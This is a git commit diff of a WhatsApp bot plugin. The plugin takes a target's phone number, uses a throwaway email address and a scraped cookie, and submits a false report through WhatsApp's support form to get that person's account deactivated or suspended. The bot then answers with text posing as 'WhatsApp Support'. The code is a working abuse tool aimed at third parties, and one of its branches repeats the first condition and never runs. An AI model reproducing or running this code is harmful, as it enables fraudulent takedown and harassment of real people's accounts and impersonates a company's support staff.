be47f3c81d8cd2ef98dec6705709ede3545adc62
Sniperghost662009 <125476080+Sniperghost662009@users.noreply.github.com>
2024-02-24 09:56:34 -0600

    Update propietario(a)-desactivarwa.js

--- plugins/propietario(a)-desactivarwa.js
+++ plugins/propietario(a)-desactivarwa.js
@@ -3,7 +3,7 @@ import axios from "axios"
 import util from 'util'
 let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
 const q = args.join(" ")    
-if (!q || !args[0]) throw '*[❗] 𝙸𝙽𝙶𝚁𝙴𝚂𝙴 𝙴𝙻 𝙽𝚄𝙼𝙴𝚁𝙾 𝚀𝚄𝙴 𝙳𝙴𝚂𝙴𝙴 𝙳𝙴𝚂𝙰𝙲𝚃𝙸𝚅𝙰𝚁 𝙴𝙽 𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙲𝙸𝙾𝙽𝙰𝙻, 𝙴𝙹𝙴𝙼𝙿𝙻𝙾: +𝟷 (𝟺𝟻0) 555-555*'
+if (!q || !args[0]) throw '*[❗] 𝙸𝙽𝙶𝚁𝙴𝚂𝙴 𝙴𝙻 𝙽𝚄𝙼𝙴𝚁𝙾 𝙴𝙽 𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙲𝙸𝙾𝙽𝙰𝙻, 𝙴𝙹𝙴𝙼𝙿𝙻𝙾: +𝟷 (𝟺𝟻0) 555-555*'
 let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
 let cookie = ntah.headers["set-cookie"].join("; ")
@@ -19,7 +19,7 @@ form.append("phone_number", q)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
-form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
+form.append("your_message", "suspendido " + q)
 form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
@@ -32,11 +32,11 @@ form.append("__comment_req", "0")
 let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
 var payload = String(res.data)
 if (payload.includes(`"payload":true`)) {
-m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
+m.reply(`##- WhatsApp Support -##/n/nHola/nGracias por tu mensaje./nNuestro sistema marcó la actividad de tu cuenta como un incumplimiento de nuestras Condiciones del servicio y, por ese motivo, suspendió tu número de teléfono. Valoramos tu participación en nuestra plataforma y lamentamos cualquier confusión o inconveniente que esto haya podido ocasionar./nSi estás usando un número de teléfono nuevo, es posible que la persona a la que pertenecía antes el número haya incumplido nuestras Condiciones del servicio y, por ese motivo, se haya suspendido la cuenta. No te preocupes, no se te penalizará por los incumplimientos de propietarios anteriores del número de teléfono./nLuego de revisar la actividad de tu cuenta, cancelamos la suspensión. Ya deberías tener acceso a WhatsApp./nComo próximo paso, te recomendamos que vuelvas a registrar tu número de teléfono en WhatsApp para asegurarte de que tengas acceso./nPuedes visitar nuestro sitio web para descargar WhatsApp o la aplicación WhatsApp Business. Nota: No brindamos soporte para aplicaciones, dispositivos o versiones de WhatsApp que no sean compatibles, ni para dispositivos liberados o con acceso`)
 } else if (payload.includes(`"payload":true`)) {
-m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
+m.reply(`##- WhatsApp Support -##/nHola,/nNuestro sistema marcó la actividad de tu cuenta como un incumplimiento de nuestras Condiciones del servicio y suspendió tu número de teléfono. Como resultado de este incumplimiento, tu cuenta permanecerá suspendida./nTe recomendamos que leas detenidamente la sección "Uso aceptable de nuestros servicios" de nuestras Condiciones del servicio para obtener más información sobre los usos apropiados de WhatsApp y las actividades que incumplen nuestras Condiciones del servicio. Para obtener más información sobre cómo usar WhatsApp de manera responsable, visita el Centro de ayuda y consulta este artículo./nPor favor, recuerda que WhatsApp se reserva el derecho de hacer cumplir sus políticas de conformidad con sus Condiciones del servicio.`)
 } else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
 }
-handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
+handler.command = /^(supportwa|swa|soporte|support)$/i
 handler.rowner = true 
 export default handler
